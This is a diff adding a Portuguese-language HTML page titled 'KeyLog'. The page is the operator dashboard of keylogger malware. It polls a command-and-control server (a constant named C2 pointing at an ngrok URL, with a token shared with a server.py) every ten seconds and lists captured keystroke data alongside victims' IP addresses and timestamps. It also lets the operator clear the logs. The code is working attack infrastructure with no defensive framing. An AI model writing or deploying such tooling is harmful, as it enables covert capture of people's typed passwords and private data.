@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<title>Monitor</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:#0a0a0f;color:#d4d4d8;font-family:'SF Mono',Consolas,monospace;
+     font-size:13px;padding:0}
+header{background:#111117;border-bottom:1px solid #1e1e2e;padding:12px 16px;
+       position:sticky;top:0;z-index:10;display:flex;align-items:center;gap:10px}
+header h1{font-size:14px;font-weight:600;color:#a78bfa;letter-spacing:.05em}
+#badge{background:#1e1e2e;border-radius:999px;padding:2px 8px;
+       font-size:11px;color:#71717a;margin-left:auto}
+#status{font-size:11px;color:#52525b;padding:6px 16px;background:#0d0d14;
+        border-bottom:1px solid #1e1e2e}
+#feed{padding:8px}
+.entry{background:#111117;border:1px solid #1e1e2e;border-radius:8px;
+       margin-bottom:8px;overflow:hidden}
+.entry-head{display:flex;gap:6px;padding:6px 10px;background:#0f0f1a;
+            border-bottom:1px solid #1e1e2e;font-size:10px;color:#52525b}
+.entry-ip{color:#818cf8}
+.entry-data{padding:8px 10px;line-height:1.6;word-break:break-all;
+            white-space:pre-wrap;color:#e2e8f0}
+.empty{text-align:center;padding:3rem;color:#3f3f46;font-size:12px}
+#controls{display:flex;gap:8px;padding:8px 16px;background:#0d0d14;
+          border-top:1px solid #1e1e2e;position:sticky;bottom:0}
+button{flex:1;padding:8px;border:1px solid #1e1e2e;border-radius:6px;
+       background:#111117;color:#a1a1aa;font-size:12px;cursor:pointer;
+       font-family:inherit}
+button:active{background:#1e1e2e}
+#btn-clear{color:#f87171;border-color:#3f1d1d}
+</style>
+</head>
+<body>
+
+<header>
+  <h1>⌨ KeyLog</h1>
+  <span id="badge">0 entradas</span>
+</header>
+<div id="status">aguardando...</div>
+<div id="feed"><div class="empty">nenhum log ainda</div></div>
+<div id="controls">
+  <button onclick="pull()">↻ Atualizar</button>
+  <button id="btn-clear" onclick="clearLogs()">🗑 Limpar</button>
+</div>
+
+<script>
+// ===== CONFIGURAR =====
+const C2 = "https://abc123.ngrok-free.app";   // trocar
+const TOKEN = "meutoken123";                // igual ao VIEW_TOKEN no server.py
+// ======================
+
+async function pull() {
+  document.getElementById("status").textContent = "buscando...";
+  try {
+    const r = await fetch(`${C2}/view?t=${TOKEN}&n=300`);
+    if (!r.ok) throw new Error("HTTP " + r.status);
+    const j = await r.json();
+    render(j.logs);
+    document.getElementById("status").textContent =
+      `atualizado ${new Date().toLocaleTimeString("pt-BR")}`;
+  } catch(e) {
+    document.getElementById("status").textContent = "erro: " + e.message;
+  }
+}
+
+function render(logs) {
+  const feed = document.getElementById("feed");
+  document.getElementById("badge").textContent = logs.length + " entradas";
+  if (!logs.length) {
+    feed.innerHTML = '<div class="empty">nenhum log ainda</div>';
+    return;
+  }
+  feed.innerHTML = logs.map(e => `
+    <div class="entry">
+      <div class="entry-head">
+        <span>${escH(e.ts)}</span>
+        <span class="entry-ip">${escH(e.ip)}</span>
+      </div>
+      <div class="entry-data">${escH(e.data)}</div>
+    </div>`).join("");
+}
+
+async function clearLogs() {
+  if (!confirm("Limpar todos os logs?")) return;
+  const fd = new FormData();
+  fd.append("t", TOKEN);
+  await fetch(`${C2}/clear`, {method:"POST", body: fd});
+  pull();
+}
+
+function escH(s) {
+  return String(s)
+    .replace(/&/g,"&amp;").replace(/</g,"&lt;")
+    .replace(/>/g,"&gt;").replace(/"/g,"&quot;");
+}
+
+pull();
+setInterval(pull, 10000); // auto-refresh 10s
+</script>
+</body>
+</html>
